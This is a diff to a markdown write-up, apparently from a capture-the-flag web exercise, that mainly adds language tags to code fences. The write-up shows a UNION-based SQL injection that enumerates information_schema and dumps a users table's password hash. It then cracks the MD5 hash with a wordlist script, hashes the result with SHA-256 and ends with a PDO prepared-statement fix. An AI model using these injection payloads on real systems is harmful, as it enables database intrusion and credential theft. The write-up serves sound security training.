@@ -9,13 +9,14 @@ Entering certain input, such as `union` triggers a SQL error that indicates SQL 
 
 ### Potential Exploitation:
 Since the input field expects an ID number, the corresponding SQL query should resemble:
-```
+```sql
 SELECT first_name, last_name FROM users WHERE users.user_id = ${input_value}
 ```
 This query prints the first name and last name of the member with the given member ID. Since we don't need the website to display data about any specific member, we can choose the ID `-1`, which is unlikely to match any existing ID.<br />
 <br />
 To append our request after the original query, we can use the `UNION` operator, and perform an UNION-based SQL injection attempt, which combines the result sets of two or more `SELECT` statements:
-```
+
+```sql
 SELECT first_name, last_name FROM users WHERE users.user_id = -1 UNION SELECT XXX FROM XXX
 ```
 This allows us to execute our exploit immediately after the original request.<br />
@@ -25,12 +26,14 @@ We aim to retrieve data from the `information_schema`. In SQL, `information_sche
 With this in mind, we have:<br />
 <br />
 INPUT:
-```
+
+```sql
 -1 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 
 OUTPUT:
-```
+
+```sql
 ID: -1 UNION select table_name, column_name FROM information_schema.columns 
 First name: users
 Surname : Commentaire
@@ -43,19 +46,21 @@ Surname : countersign
 The result reveals a `users` table and two interesting columns: `Commentaire` and `countersign`. Subsequently, we will send the following request to retrieve these two fields from all users in the database:<br />
 <br />
 INPUT:
-```
+
+```sql
 -1 UNION SELECT commentaire, countersign FROM users
 ```
 
 OUTPUT:
-```
+
+```sql
 ID: -1 union select commentaire, countersign from users 
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 ```
 
 Since the password appears to be a hash, we need to determine the hash type before obtaining the original string. For this, we will use the hash-identifier tool on Kali Linux:
-```
+```sh
 user@kali:~$ hash-identifier
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -78,7 +83,7 @@ Possible Hashs:
 ```
 
 Now, it has been determined that the password is likely hashed with `MD5`. We will proceed to generate a word list in `wordlist.txt` and create a script named `md5comparer.sh`. The script will hash each word from the word list using MD5 and compare the generated hashes with the password until a match is found:
-```
+```sh
 user@kali:~$ ./md5comparer.sh wordlist.txt $(cat pwd.txt)
 no match found for: 'quarantedeux'
 no match found for: 'quarante-deux'
@@ -101,7 +106,7 @@ Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 We will, therefore, convert all the characters to lowercase: `FortyTwo -> fortytwo`
 
 ...and hash it with SHA-256:
-```
+```sh
 user@kali:~$ echo -n "fortytwo" | sha256sum
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
 ```
@@ -115,7 +120,7 @@ Inspecting the HTML code, this line:
 reveals that the website is coded in `PHP`.<br />
 To avoid SQL injection in PHP, it is recommended to use `prepared statements` with `parameterized queries`. Below are examples demonstrating how to use prepared statements in PHP with MySQL using the `PDO extension`:
 
-```
+```php
 // Connect to database
 $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
 $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
